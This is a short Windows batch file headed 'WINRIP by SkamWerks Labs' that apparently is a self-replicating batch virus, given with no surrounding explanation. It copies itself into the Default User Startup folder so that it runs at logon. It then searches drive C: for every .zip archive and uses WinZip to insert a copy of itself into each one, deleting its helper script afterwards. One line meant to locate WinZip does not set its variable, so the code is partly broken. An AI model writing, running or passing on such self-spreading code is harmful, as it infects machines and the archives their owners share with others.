@echo off
@echo REM WINRIP by SkamWerks Labs > winripem.bat
@copy winrip.bat "c:\..\..\..\..\..\..\..\winnt\profiles\default user\start menu\programs\startup\winrip.bat"
@dir /s /b /l c:\winzip32.exe | set wz=
@FOR /F "delims==" %%y IN ('dir /s /b /l c:\*.zip') DO @echo "%wz%" -min -a -r -p "%%y" "c:\..\..\..\..\..\..\..\winnt\profiles\default user\start menu\programs\startup\winrip.bat" >> winripem.bat
@call winripem.bat
@del winripem.bat
